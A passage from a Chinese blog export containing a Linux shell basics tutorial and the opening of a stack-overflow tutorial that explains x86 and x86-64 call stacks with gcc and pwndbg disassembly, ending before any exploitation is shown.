<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">tac</span><br><span class="line">wc</span><br><span class="line">sort</span><br><span class="line">uniq</span><br><span class="line">diff</span><br><span class="line">comm</span><br><span class="line">cut</span><br><span class="line">xargs</span><br><span class="line">sed</span><br><span class="line">awk</span><br><span class="line">ln</span><br><span class="line">df</span><br><span class="line">free</span><br><span class="line">id</span><br><span class="line">uname</span><br><span class="line">hostname</span><br><span class="line">jobs</span><br><span class="line">fg</span><br><span class="line">bg</span><br><span class="line">whoami</span><br><span class="line">ps</span><br><span class="line">top</span><br><span class="line">w</span><br><span class="line">du</span><br><span class="line">tar</span><br><span class="line">reboot</span><br><span class="line">shutdown</span><br><span class="line">poweroff</span><br><span class="line">mount</span><br><span class="line">umount</span><br><span class="line">sudo</span><br><span class="line">env</span><br><span class="line">apt</span><br><span class="line">kill</span><br><span class="line">type</span><br><span class="line">history</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<blockquote>
<ul>
<li>顺带提一句，这一些命令之所以可以直接使用（例如 <code>ls</code>），是因为 <code>ls</code> 程序所在目录（<code>/usr/bin</code>）已经被加入了环境变量 <code>$PATH</code>中，执行 <code>ls</code> 与 <code>/usr/bin/ls</code> 是一样的<ul>
<li>当然，还有一些命令是 shell 内置的，例如 <code>cd</code>, <code>eval</code> 等，更多信息可以自行搜索 <code>Shell builtin</code> 查看学习</li>
</ul>
</li>
<li>再提一句，执行目标程序可以使用绝对路径或相对路径，例如执行当前目录（假设在 <code>/tmp</code>）下的 <code>hello.sh</code> 脚本，可以输入 <code>./hello.sh</code> 或 <code>/tmp/hello.sh</code> 回车后执行</li>
</ul>
</blockquote>
<h3 id="一些琐碎的知识点"><a href="#一些琐碎的知识点" class="headerlink" title="一些琐碎的知识点"></a>一些琐碎的知识点</h3><ul>
<li>当前目录: <code>.</code></li>
<li>上一级目录: <code>..</code></li>
<li>根目录: <code>/</code></li>
<li>家目录: <code>~</code></li>
<li><code>cd -</code> (切换到上一次所在的目录)</li>
<li><code>command ; command</code> (顺序执行命令)</li>
<li><code>command1 || command2</code> (command1 执行失败时执行 command2)</li>
<li><code>command1 &amp;&amp; command2</code> (command1 执行成功时执行 command2)</li>
<li><code>command &amp;</code> (后台执行命令)</li>
<li>变量<ul>
<li>定义变量: <code>var=1</code></li>
<li>使用变量: <code>$var</code><ul>
<li>单引号中的变量不会被解析</li>
<li>双引号中的变量会被解析</li>
</ul>
</li>
<li>取消变量: <code>unset var</code></li>
</ul>
</li>
<li>环境变量: <ul>
<li><code>$PATH</code> (用于存放可执行文件的路径)</li>
<li><code>$HOME</code> (家目录)</li>
<li><code>$USER</code> (当前用户)</li>
<li><code>$PWD</code> (当前工作目录)</li>
<li><code>$?</code> (上一条命令的返回值)</li>
<li>…</li>
<li>使用 <code>export</code> 命令可以将变量导出到环境变量中</li>
</ul>
</li>
<li>通配符:<ul>
<li><code>*</code> (匹配任意多个字符)</li>
<li><code>?</code> (匹配任意一个字符)</li>
<li><code>[]</code> (匹配任意一个字符)</li>
<li><code>&#123;&#125;</code> (匹配任意一个字符串)</li>
</ul>
</li>
</ul>
<h3 id="一些常用的快捷键"><a href="#一些常用的快捷键" class="headerlink" title="一些常用的快捷键"></a>一些常用的快捷键</h3><ul>
<li><code>Ctrl + C</code> (中断当前程序)</li>
<li><code>Ctrl + Z</code> (挂起当前程序)</li>
<li><code>Ctrl + A</code> (移动光标到行首)</li>
<li><code>Ctrl + E</code> (移动光标到行尾)</li>
</ul>
<h3 id="一些常用的软件命令"><a href="#一些常用的软件命令" class="headerlink" title="一些常用的软件命令"></a>一些常用的软件命令</h3><ul>
<li><code>vim</code> (文本编辑器)</li>
<li><code>git</code> (版本控制工具)</li>
<li><code>wget</code> (下载工具)</li>
<li><code>curl</code> (下载工具)</li>
<li><code>ssh</code> (远程登录工具)</li>
<li><code>tmux</code> (终端复用工具)</li>
<li><code>htop</code> (进程查看工具)</li>
<li><code>tree</code> (目录树查看工具)</li>
<li><code>ifconfig</code> (查看网络信息, 需安装 net-tools)</li>
<li>…</li>
</ul>
<h3 id="关于文件权限"><a href="#关于文件权限" class="headerlink" title="关于文件权限"></a>关于文件权限</h3><ul>
<li>📙 <a href="https://www.runoob.com/linux/linux-file-attr-permission.html">Linux 文件基本属性</a></li>
<li><code>r</code> (读权限, 4)</li>
<li><code>w</code> (写权限, 2)</li>
<li><code>x</code> (执行权限, 1)</li>
</ul>
<h3 id="关于重定向"><a href="#关于重定向" class="headerlink" title="关于重定向"></a>关于重定向</h3><ul>
<li>📙 <a href="https://www.runoob.com/linux/linux-shell-io-redirections.html">Shell 输入&#x2F;输出重定向</a></li>
<li>管道: <code>|</code> (将前一个命令的输出作为后一个命令的输入)<ul>
<li>例如：<code>ls | grep .txt</code> (列出当前目录下所有的 txt 文件)</li>
</ul>
</li>
</ul>
<h3 id="关于-find-命令"><a href="#关于-find-命令" class="headerlink" title="关于 find 命令"></a>关于 find 命令</h3><ul>
<li>📙 <a href="https://www.runoob.com/linux/linux-comm-find.html">Linux find 命令</a></li>
</ul>
<h2 id="shell-脚本"><a href="#shell-脚本" class="headerlink" title="shell 脚本"></a>shell 脚本</h2><ul>
<li><code>hello.sh</code>:</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line">echo &quot;Hello World!&quot;</span><br></pre></td></tr></table></figure>

<ul>
<li><p>这里第一行的 <code>#!</code> 是一个约定的标记，它告诉系统这个脚本需要什么解释器来执行，即使用 <code>/bin/bash</code> 来执行这个脚本</p>
<ul>
<li>当脚本具有可执行权限时，可以直接执行脚本: <code>./hello.sh</code>，此时会调用 <code>/bin/bash</code> 来执行脚本</li>
</ul>
</li>
<li><p>更多资料可查看 👉 📘 <a href="https://shellscript.readthedocs.io/zh_CN/latest/index.html">ShellScript Doc</a></p>
</li>
</ul>
<h2 id="学习资料"><a href="#学习资料" class="headerlink" title="学习资料"></a>学习资料</h2><ul>
<li>📙 <a href="https://missing-semester-cn.github.io/2020/course-shell/">missing-semester – shell</a></li>
<li>📙 <a href="https://missing-semester-cn.github.io/2020/course-shell/">missing-semester – shell 工具和脚本</a></li>
</ul>
<h2 id="扩展练习"><a href="#扩展练习" class="headerlink" title="扩展练习"></a>扩展练习</h2><ul>
<li><a href="https://overthewire.org/wargames/bandit">🔥 Bandit - Linux命令练习靶场</a></li>
</ul>
]]></content>
      <categories>
        <category>Tool</category>
      </categories>
      <tags>
        <tag>Tutorial</tag>
        <tag>助教课件</tag>
      </tags>
  </entry>
  <entry>
    <title>Pwn 栈溢出</title>
    <url>/2022/08/13/stackoverflow/</url>
    <content><![CDATA[<h1 id="栈溢出"><a href="#栈溢出" class="headerlink" title="栈溢出"></a>栈溢出</h1><h2 id="前置知识需求"><a href="#前置知识需求" class="headerlink" title="前置知识需求"></a>前置知识需求</h2><ul>
<li>C、Python</li>
<li>x86-64、x86 汇编</li>
<li>gdb、objdump 等工具</li>
<li>linux</li>
</ul>
<details class="note info"><summary><p>参考资料</p>
</summary>
<ul>
<li><a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/stack-intro/">CTF Wiki - 栈介绍</a></li>
<li><a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/stackoverflow-basic/">CTF Wiki - 栈溢出原理</a></li>
</ul>

</details>

<h2 id="栈"><a href="#栈" class="headerlink" title="栈"></a>栈</h2><details class="note info"><summary><p>Wikipedia</p>
</summary>
<p><a href="https://zh.m.wikipedia.org/zh-hans/%E5%A0%86%E6%A0%88">维基百科-堆栈(一种数据结构) 👇</a></p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/Pasted%20image%2020220812194240.png" alt="Pasted image 20220812194240"></p>
<p><a href="https://zh.m.wikipedia.org/wiki/%E5%91%BC%E5%8F%AB%E5%A0%86%E7%96%8A">维基百科-调用栈 👇</a></p>
<img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20231020102621336.png" alt="image-20231020102621336" style="zoom:50%;" />


</details>


<h3 id="函数调用栈"><a href="#函数调用栈" class="headerlink" title="函数调用栈"></a>函数调用栈</h3><div class="note warning"><p>注意: 以下内容仅涉及 x86 架构CPU，暂不考虑 ARM、MIPS 等架构</p>
</div>

<p>一个简单的例子：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// demo.c</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">func</span><span class="params">(<span class="type">int</span> arg1, <span class="type">int</span> arg2, <span class="type">int</span> arg3, <span class="type">int</span> arg4, <span class="type">int</span> arg5, <span class="type">int</span> arg6, <span class="type">int</span> arg7, <span class="type">int</span> arg8)</span> &#123;</span><br><span class="line">    <span class="type">int</span> loc1 = arg1 + arg3;</span><br><span class="line">    <span class="type">int</span> loc2 = arg6 + arg8;</span><br><span class="line">    <span class="type">int</span> loc3 = arg2 + arg7;</span><br><span class="line">    <span class="keyword">return</span> loc1 + loc2 + loc3;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    func(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// gcc -m32 -no-pie -fno-pie demo.c -o call_stack_32</span></span><br><span class="line"><span class="comment">// gcc -no-pie -fno-pie demo.c -o call_stack</span></span><br></pre></td></tr></table></figure>

<details class="note info"><summary><p>gcc参数说明</p>
</summary>
<ul>
<li><code>-m32</code> 用于指明生成 32bit 程序</li>
<li><code>-no-pie</code> 用于指明禁用生成位置无关(PIE)文件</li>
<li><code>-fno-pie</code> 类似于 <code>-no-pie</code>，但这个是作为编译选项来指定的，而 <code>-no-pie</code>是作为链接器选项来指定的，这两者的区别可以看<a href="https://stackoverflow.com/questions/74300190/difference-between-fno-pie-and-no-pie">这个回答</a></li>
</ul>

</details>

<p>接下来通过 GDB 进行调试分析：</p>
<blockquote>
<p>这里的 GDB 安装了 <a href="https://github.com/pwndbg/pwndbg">pwndbg</a> 插件</p>
</blockquote>
<h4 id="32bit"><a href="#32bit" class="headerlink" title="32bit"></a>32bit</h4><ul>
<li>现在 32bit 的机器很少了，CTF比赛中基本上全是 64bit 的程序</li>
<li>重点放在 64bit，不过 32bit 的还是需要学习</li>
</ul>
<p>接下来是 32bit 的情况：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// gdb call_stack_32</span></span><br><span class="line">pwndbg&gt; disass main</span><br><span class="line">Dump of assembler code <span class="keyword">for</span> function main:</span><br><span class="line">=&gt; <span class="number">0x080491b0</span> &lt;+<span class="number">0</span>&gt;:		endbr32 </span><br><span class="line">   <span class="number">0x080491b4</span> &lt;+<span class="number">4</span>&gt;:		push   ebp</span><br><span class="line">   <span class="number">0x080491b5</span> &lt;+<span class="number">5</span>&gt;:		mov    ebp,esp</span><br><span class="line">   <span class="number">0x080491b7</span> &lt;+<span class="number">7</span>&gt;:		push   <span class="number">0x8</span></span><br><span class="line">   <span class="number">0x080491b9</span> &lt;+<span class="number">9</span>&gt;:		push   <span class="number">0x7</span></span><br><span class="line">   <span class="number">0x080491bb</span> &lt;+<span class="number">11</span>&gt;:	push   <span class="number">0x6</span></span><br><span class="line">   <span class="number">0x080491bd</span> &lt;+<span class="number">13</span>&gt;:	push   <span class="number">0x5</span></span><br><span class="line">   <span class="number">0x080491bf</span> &lt;+<span class="number">15</span>&gt;:	push   <span class="number">0x4</span></span><br><span class="line">   <span class="number">0x080491c1</span> &lt;+<span class="number">17</span>&gt;:	push   <span class="number">0x3</span></span><br><span class="line">   <span class="number">0x080491c3</span> &lt;+<span class="number">19</span>&gt;:	push   <span class="number">0x2</span></span><br><span class="line">   <span class="number">0x080491c5</span> &lt;+<span class="number">21</span>&gt;:	push   <span class="number">0x1</span></span><br><span class="line">   <span class="number">0x080491c7</span> &lt;+<span class="number">23</span>&gt;:	call   <span class="number">0x8049176</span> &lt;func&gt;</span><br><span class="line">   <span class="number">0x080491cc</span> &lt;+<span class="number">28</span>&gt;:	add    esp,<span class="number">0x20</span></span><br><span class="line">   <span class="number">0x080491cf</span> &lt;+<span class="number">31</span>&gt;:	mov    eax,<span class="number">0x0</span></span><br><span class="line">   <span class="number">0x080491d4</span> &lt;+<span class="number">36</span>&gt;:	leave  </span><br><span class="line">   <span class="number">0x080491d5</span> &lt;+<span class="number">37</span>&gt;:	ret    </span><br><span class="line">End of assembler dump.</span><br><span class="line">pwndbg&gt; disass func</span><br><span class="line">Dump of assembler code <span class="keyword">for</span> function func:</span><br><span class="line">   <span class="number">0x08049176</span> &lt;+<span class="number">0</span>&gt;:		endbr32 </span><br><span class="line">   <span class="number">0x0804917a</span> &lt;+<span class="number">4</span>&gt;:		push   ebp</span><br><span class="line">   <span class="number">0x0804917b</span> &lt;+<span class="number">5</span>&gt;:		mov    ebp,esp</span><br><span class="line">   <span class="number">0x0804917d</span> &lt;+<span class="number">7</span>&gt;:		sub    esp,<span class="number">0x10</span></span><br><span class="line">   <span class="number">0x08049180</span> &lt;+<span class="number">10</span>&gt;:	mov    edx,DWORD PTR [ebp+<span class="number">0x8</span>]</span><br><span class="line">   <span class="number">0x08049183</span> &lt;+<span class="number">13</span>&gt;:	mov    eax,DWORD PTR [ebp+<span class="number">0x10</span>]</span><br><span class="line">   <span class="number">0x08049186</span> &lt;+<span class="number">16</span>&gt;:	add    eax,edx</span><br><span class="line">   <span class="number">0x08049188</span> &lt;+<span class="number">18</span>&gt;:	mov    DWORD PTR [ebp<span class="number">-0xc</span>],eax</span><br><span class="line">   <span class="number">0x0804918b</span> &lt;+<span class="number">21</span>&gt;:	mov    edx,DWORD PTR [ebp+<span class="number">0x1c</span>]</span><br><span class="line">   <span class="number">0x0804918e</span> &lt;+<span class="number">24</span>&gt;:	mov    eax,DWORD PTR [ebp+<span class="number">0x24</span>]</span><br><span class="line">   <span class="number">0x08049191</span> &lt;+<span class="number">27</span>&gt;:	add    eax,edx</span><br><span class="line">   <span class="number">0x08049193</span> &lt;+<span class="number">29</span>&gt;:	mov    DWORD PTR [ebp<span class="number">-0x8</span>],eax</span><br><span class="line">   <span class="number">0x08049196</span> &lt;+<span class="number">32</span>&gt;:	mov    edx,DWORD PTR [ebp+<span class="number">0xc</span>]</span><br><span class="line">   <span class="number">0x08049199</span> &lt;+<span class="number">35</span>&gt;:	mov    eax,DWORD PTR [ebp+<span class="number">0x20</span>]</span><br><span class="line">   <span class="number">0x0804919c</span> &lt;+<span class="number">38</span>&gt;:	add    eax,edx</span><br><span class="line">   <span class="number">0x0804919e</span> &lt;+<span class="number">40</span>&gt;:	mov    DWORD PTR [ebp<span class="number">-0x4</span>],eax</span><br><span class="line">   <span class="number">0x080491a1</span> &lt;+<span class="number">43</span>&gt;:	mov    edx,DWORD PTR [ebp<span class="number">-0xc</span>]</span><br><span class="line">   <span class="number">0x080491a4</span> &lt;+<span class="number">46</span>&gt;:	mov    eax,DWORD PTR [ebp<span class="number">-0x8</span>]</span><br><span class="line">   <span class="number">0x080491a7</span> &lt;+<span class="number">49</span>&gt;:	add    edx,eax</span><br><span class="line">   <span class="number">0x080491a9</span> &lt;+<span class="number">51</span>&gt;:	mov    eax,DWORD PTR [ebp<span class="number">-0x4</span>]</span><br><span class="line">   <span class="number">0x080491ac</span> &lt;+<span class="number">54</span>&gt;:	add    eax,edx</span><br><span class="line">   <span class="number">0x080491ae</span> &lt;+<span class="number">56</span>&gt;:	leave  </span><br><span class="line">   <span class="number">0x080491af</span> &lt;+<span class="number">57</span>&gt;:	ret    </span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure>

<p>当程序执行至 <code> ► 0x8049180 &lt;func+10&gt;    mov    edx, dword ptr [ebp + 8]</code> 时，此时的栈：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; <span class="built_in">stack</span> <span class="number">0x10</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ esp <span class="number">0xffffd480</span> —▸ <span class="number">0xf7fbc3fc</span> (__exit_funcs) —▸ <span class="number">0xf7fbd180</span> (initial) ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0004</span>│     <span class="number">0xffffd484</span> ◂— <span class="number">0x80000</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0008</span>│     <span class="number">0xffffd488</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">03</span>:<span class="number">000</span>c│     <span class="number">0xffffd48c</span> —▸ <span class="number">0x8049233</span> (__libc_csu_init+<span class="number">83</span>) ◂— <span class="number">0x8301c683</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0010</span>│ ebp <span class="number">0xffffd490</span> —▸ <span class="number">0xffffd4b8</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0014</span>│     <span class="number">0xffffd494</span> —▸ <span class="number">0x80491cc</span> (main+<span class="number">28</span>) ◂— <span class="number">0xb820c483</span>  <span class="comment">// 返回地址</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0018</span>│     <span class="number">0xffffd498</span> ◂— <span class="number">0x1</span>                                <span class="comment">// arg1</span></span><br><span class="line"><span class="number">07</span>:<span class="number">001</span>c│     <span class="number">0xffffd49c</span> ◂— <span class="number">0x2</span>                                <span class="comment">// arg2</span></span><br><span class="line"><span class="number">08</span>:<span class="number">0020</span>│     <span class="number">0xffffd4a0</span> ◂— <span class="number">0x3</span>                                <span class="comment">// ...</span></span><br><span class="line"><span class="number">09</span>:<span class="number">0024</span>│     <span class="number">0xffffd4a4</span> ◂— <span class="number">0x4</span></span><br><span class="line"><span class="number">0</span>a:<span class="number">0028</span>│     <span class="number">0xffffd4a8</span> ◂— <span class="number">0x5</span></span><br><span class="line"><span class="number">0b</span>:<span class="number">002</span>c│     <span class="number">0xffffd4ac</span> ◂— <span class="number">0x6</span></span><br><span class="line"><span class="number">0</span>c:<span class="number">0030</span>│     <span class="number">0xffffd4b0</span> ◂— <span class="number">0x7</span></span><br><span class="line"><span class="number">0</span>d:<span class="number">0034</span>│     <span class="number">0xffffd4b4</span> ◂— <span class="number">0x8</span></span><br><span class="line"><span class="number">0</span>e:<span class="number">0038</span>│     <span class="number">0xffffd4b8</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">0f</span>:<span class="number">003</span>c│     <span class="number">0xffffd4bc</span> —▸ <span class="number">0xf7debed5</span> (__libc_start_main+<span class="number">245</span>) ◂— add    esp, <span class="number">0x10</span></span><br></pre></td></tr></table></figure>

<ul>
<li>32bit 情况下函数参数在函数返回地址的上方 (所有参数都在栈上)</li>
<li>内存地址不能大于 0x00007FFFFFFFFFFF，6 个字节长度，否则会抛出异常。</li>
</ul>
<h4 id="64bit"><a href="#64bit" class="headerlink" title="64bit"></a>64bit</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// gdb call_stack</span></span><br><span class="line">pwndbg&gt; disass main</span><br><span class="line">Dump of assembler code <span class="keyword">for</span> function main:</span><br><span class="line">=&gt; <span class="number">0x0000000000401152</span> &lt;+<span class="number">0</span>&gt;:		endbr64 </span><br><span class="line">   <span class="number">0x0000000000401156</span> &lt;+<span class="number">4</span>&gt;:		push   rbp</span><br><span class="line">   <span class="number">0x0000000000401157</span> &lt;+<span class="number">5</span>&gt;:		mov    rbp,rsp</span><br><span class="line">   <span class="number">0x000000000040115a</span> &lt;+<span class="number">8</span>&gt;:		push   <span class="number">0x8</span></span><br><span class="line">   <span class="number">0x000000000040115c</span> &lt;+<span class="number">10</span>&gt;:	push   <span class="number">0x7</span></span><br><span class="line">   <span class="number">0x000000000040115e</span> &lt;+<span class="number">12</span>&gt;:	mov    r9d,<span class="number">0x6</span></span><br><span class="line">   <span class="number">0x0000000000401164</span> &lt;+<span class="number">18</span>&gt;:	mov    r8d,<span class="number">0x5</span></span><br><span class="line">   <span class="number">0x000000000040116a</span> &lt;+<span class="number">24</span>&gt;:	mov    ecx,<span class="number">0x4</span></span><br><span class="line">   <span class="number">0x000000000040116f</span> &lt;+<span class="number">29</span>&gt;:	mov    edx,<span class="number">0x3</span></span><br><span class="line">   <span class="number">0x0000000000401174</span> &lt;+<span class="number">34</span>&gt;:	mov    esi,<span class="number">0x2</span></span><br><span class="line">   <span class="number">0x0000000000401179</span> &lt;+<span class="number">39</span>&gt;:	mov    edi,<span class="number">0x1</span></span><br><span class="line">   <span class="number">0x000000000040117e</span> &lt;+<span class="number">44</span>&gt;:	call   <span class="number">0x401106</span> &lt;func&gt;</span><br><span class="line">   <span class="number">0x0000000000401183</span> &lt;+<span class="number">49</span>&gt;:	add    rsp,<span class="number">0x10</span></span><br><span class="line">   <span class="number">0x0000000000401187</span> &lt;+<span class="number">53</span>&gt;:	mov    eax,<span class="number">0x0</span></span><br><span class="line">   <span class="number">0x000000000040118c</span> &lt;+<span class="number">58</span>&gt;:	leave  </span><br><span class="line">   <span class="number">0x000000000040118d</span> &lt;+<span class="number">59</span>&gt;:	ret    </span><br><span class="line">End of assembler dump.</span><br><span class="line">pwndbg&gt; disass func</span><br><span class="line">Dump of assembler code <span class="keyword">for</span> function func:</span><br><span class="line">   <span class="number">0x0000000000401106</span> &lt;+<span class="number">0</span>&gt;:		endbr64 </span><br><span class="line">   <span class="number">0x000000000040110a</span> &lt;+<span class="number">4</span>&gt;:		push   rbp</span><br><span class="line">   <span class="number">0x000000000040110b</span> &lt;+<span class="number">5</span>&gt;:		mov    rbp,rsp</span><br><span class="line">   <span class="number">0x000000000040110e</span> &lt;+<span class="number">8</span>&gt;:		mov    DWORD PTR [rbp<span class="number">-0x14</span>],edi</span><br><span class="line">   <span class="number">0x0000000000401111</span> &lt;+<span class="number">11</span>&gt;:	mov    DWORD PTR [rbp<span class="number">-0x18</span>],esi</span><br><span class="line">   <span class="number">0x0000000000401114</span> &lt;+<span class="number">14</span>&gt;:	mov    DWORD PTR [rbp<span class="number">-0x1c</span>],edx</span><br><span class="line">   <span class="number">0x0000000000401117</span> &lt;+<span class="number">17</span>&gt;:	mov    DWORD PTR [rbp<span class="number">-0x20</span>],ecx</span><br><span class="line">   <span class="number">0x000000000040111a</span> &lt;+<span class="number">20</span>&gt;:	mov    DWORD PTR [rbp<span class="number">-0x24</span>],r8d</span><br><span class="line">   <span class="number">0x000000000040111e</span> &lt;+<span class="number">24</span>&gt;:	mov    DWORD PTR [rbp<span class="number">-0x28</span>],r9d</span><br><span class="line">   <span class="number">0x0000000000401122</span> &lt;+<span class="number">28</span>&gt;:	mov    edx,DWORD PTR [rbp<span class="number">-0x14</span>]</span><br><span class="line">   <span class="number">0x0000000000401125</span> &lt;+<span class="number">31</span>&gt;:	mov    eax,DWORD PTR [rbp<span class="number">-0x1c</span>]</span><br><span class="line">   <span class="number">0x0000000000401128</span> &lt;+<span class="number">34</span>&gt;:	add    eax,edx</span><br><span class="line">   <span class="number">0x000000000040112a</span> &lt;+<span class="number">36</span>&gt;:	mov    DWORD PTR [rbp<span class="number">-0xc</span>],eax</span><br><span class="line">   <span class="number">0x000000000040112d</span> &lt;+<span class="number">39</span>&gt;:	mov    edx,DWORD PTR [rbp<span class="number">-0x28</span>]</span><br><span class="line">   <span class="number">0x0000000000401130</span> &lt;+<span class="number">42</span>&gt;:	mov    eax,DWORD PTR [rbp+<span class="number">0x18</span>]</span><br><span class="line">   <span class="number">0x0000000000401133</span> &lt;+<span class="number">45</span>&gt;:	add    eax,edx</span><br><span class="line">   <span class="number">0x0000000000401135</span> &lt;+<span class="number">47</span>&gt;:	mov    DWORD PTR [rbp<span class="number">-0x8</span>],eax</span><br><span class="line">   <span class="number">0x0000000000401138</span> &lt;+<span class="number">50</span>&gt;:	mov    edx,DWORD PTR [rbp<span class="number">-0x18</span>]</span><br><span class="line">   <span class="number">0x000000000040113b</span> &lt;+<span class="number">53</span>&gt;:	mov    eax,DWORD PTR [rbp+<span class="number">0x10</span>]</span><br><span class="line">   <span class="number">0x000000000040113e</span> &lt;+<span class="number">56</span>&gt;:	add    eax,edx</span><br><span class="line">   <span class="number">0x0000000000401140</span> &lt;+<span class="number">58</span>&gt;:	mov    DWORD PTR [rbp<span class="number">-0x4</span>],eax</span><br><span class="line">   <span class="number">0x0000000000401143</span> &lt;+<span class="number">61</span>&gt;:	mov    edx,DWORD PTR [rbp<span class="number">-0xc</span>]</span><br><span class="line">   <span class="number">0x0000000000401146</span> &lt;+<span class="number">64</span>&gt;:	mov    eax,DWORD PTR [rbp<span class="number">-0x8</span>]</span><br><span class="line">   <span class="number">0x0000000000401149</span> &lt;+<span class="number">67</span>&gt;:	add    edx,eax</span><br><span class="line">   <span class="number">0x000000000040114b</span> &lt;+<span class="number">69</span>&gt;:	mov    eax,DWORD PTR [rbp<span class="number">-0x4</span>]</span><br><span class="line">   <span class="number">0x000000000040114e</span> &lt;+<span class="number">72</span>&gt;:	add    eax,edx</span><br><span class="line">   <span class="number">0x0000000000401150</span> &lt;+<span class="number">74</span>&gt;:	pop    rbp</span><br><span class="line">   <span class="number">0x0000000000401151</span> &lt;+<span class="number">75</span>&gt;:	ret    </span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure>

<p>进入 func 函数时，此时的寄存器值：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">RAX  <span class="number">0x401152</span> (main) ◂— <span class="number">0xe5894855fa1e0ff3</span></span><br><span class="line">RBX  <span class="number">0x401190</span> (__libc_csu_init) ◂— <span class="number">0x8d4c5741fa1e0ff3</span></span><br><span class="line">RCX  <span class="number">0x4</span>  <span class="comment">// arg4</span></span><br><span class="line">RDX  <span class="number">0x3</span>  <span class="comment">// arg3</span></span><br><span class="line">RDI  <span class="number">0x1</span>  <span class="comment">// arg1</span></span><br><span class="line">RSI  <span class="number">0x2</span>  <span class="comment">// arg2</span></span><br><span class="line">R8   <span class="number">0x5</span>  <span class="comment">// ...</span></span><br><span class="line">R9   <span class="number">0x6</span></span><br><span class="line">R10  <span class="number">0x0</span></span><br><span class="line">R11  <span class="number">0x0</span></span><br></pre></td></tr></table></figure>

<p>当执行到 <code>0x401150 &lt;func+74&gt;    pop    rbp</code> 时，此时的栈：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ rbp rsp <span class="number">0x7fffffffe320</span> —▸ <span class="number">0x7fffffffe340</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│         <span class="number">0x7fffffffe328</span> —▸ <span class="number">0x401183</span> (main+<span class="number">49</span>) ◂— <span class="number">0xb810c48348</span> # 返回地址</span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│         <span class="number">0x7fffffffe330</span> ◂— <span class="number">0x7</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│         <span class="number">0x7fffffffe338</span> ◂— <span class="number">0x8</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│         <span class="number">0x7fffffffe340</span> ◂— <span class="number">0x0</span></span><br></pre></td></tr></table></figure>

<ul>
<li>64bit 环境下，前六个参数通过寄存器传递 (依次是 rdi, rsi, rdx, rcx, r8, r9)，其余的参数再通过栈传递</li>
<li>函数返回值通过 rax 寄存器传递</li>
</ul>
<p>64位的常用寄存器：</p>
<img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20220118093536407.png" alt="image-20220118093536407" style="zoom:50%;" />

<details class="note success"><summary><p>📌Q1: endbr64 指令干啥用的</p>
</summary>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20211226130846802.png" alt="image-20211226130846802"></p>
<ul>
<li>来自 <a href="https://blog.csdn.net/clh14281055/article/details/117446588">csdn</a> 的回答<br><strong>Intel CET的作用及endbr64指令</strong>：<br>Intel CET提供了影子栈及间接跳转指令追踪功能，保护控制流完整性（wiki: <a href="https://en.wikipedia.org/wiki/Control-flow_integrity">here</a>）。<br>Intel CET相关的指令如endbr64是后向（backward）兼容的。<br>在Intel CET中，间接跳转的处理逻辑中被插入一段过程：将CPU状态从<em>DLE</em>切换成<em>WAIT_FOR_ENDBRANCH</em>。<br>在间接跳转之后查看下一条指令是不是endbr64。如果指令是endbr64指令，那么该指令会将CPU状态从<em>WAIT_FOR_ENDBRANCH</em>恢复成<em>DLE</em>。另一方面，如果下一条指令不是endbr64，说明程序可能被控制流劫持了，CPU就报错（#CP）。<strong>因为按照正确的逻辑，间接跳转后应该需要有一条对应的endbr64指令来回应间接跳转，如果不是endbr64指令，那么程序控制流可能被劫持并前往其它地址（其它任意地址上是以非endbr64开始的汇编代码）</strong>（涉及编译器兼容CPU新特性）。</li>
</ul>

</details>

<details class="note success"><summary><p>📌Q2: 为什么反编译的代码里面没有 <code>sub rsp, xxx</code></p>
</summary>
<ul>
